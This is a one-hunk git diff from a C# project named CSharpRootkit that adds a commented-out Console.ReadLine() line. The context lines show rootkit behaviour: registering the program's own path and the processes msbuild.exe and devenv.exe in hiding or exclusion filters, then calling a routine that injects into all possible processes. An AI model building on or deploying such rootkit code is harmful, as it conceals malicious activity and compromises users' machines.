@@ -23,6 +23,7 @@ namespace CSharpRootkit
             RootKitInterface.AddInclusionExclusionFilePath(Assembly.GetEntryAssembly().Location);
             RootKitInterface.AddInclusionExclusionProcessName("msbuild.exe");
             RootKitInterface.AddInclusionExclusionProcessName("devenv.exe");
+            //Console.ReadLine();
             InjectAllPossible();
             //new Thread(InjectAllPossibleLoop).Start();
 
